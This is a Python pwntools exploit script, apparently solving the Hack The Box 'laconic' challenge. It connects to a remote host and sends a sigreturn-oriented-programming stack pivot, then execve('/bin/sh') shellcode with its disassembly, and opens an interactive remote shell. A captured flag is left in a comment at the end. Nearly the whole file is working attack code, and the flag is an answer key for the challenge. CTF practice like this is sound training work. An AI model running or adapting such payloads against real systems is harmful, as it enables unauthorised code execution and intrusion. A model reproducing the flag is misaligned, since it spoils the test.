from pwn import *

e = ELF("./laconic")
context.arch = "amd64"

script = '''
b *0x43015
'''

p = remote("83.136.252.198", 35568)
#p = process("./laconic")
#p = gdb.debug("./laconic", gdbscript = script)

syscall_ret = 0x43015
pop_rax = 0x43018

# stack pivot by SROP
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x43800 - 0x8
frame.rdx = 0x106
frame.rip = 0x43015
frame.rsp = 0x43800

payload = b"A" * 8
payload += p64(pop_rax) + p64(0xf)
payload += p64(syscall_ret)
payload += bytes(frame)

payload = payload[:0x106:]
p.send(payload)

# ret2shellcode
'''
0:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
7:  73 68 00
a:  53                      push   rbx
b:  48 89 e7                mov    rdi,rsp
e:  5b                      pop    rbx
f:  48 31 d2                xor    rdx,rdx
12: 48 31 f6                xor    rsi,rsi
15: 48 c7 c0 3b 00 00 00    mov    rax,0x3b
1c: 0f 05                   syscall
'''
shellcode = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x5B\x48\x31\xD2\x48\x31\xF6\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
payload = b"A" * 8
payload += p64(0x43808) + shellcode
p.send(payload)

p.interactive()
#HTB{s1l3nt_r0p_70ffffb8356f6d5241e1def16532967f}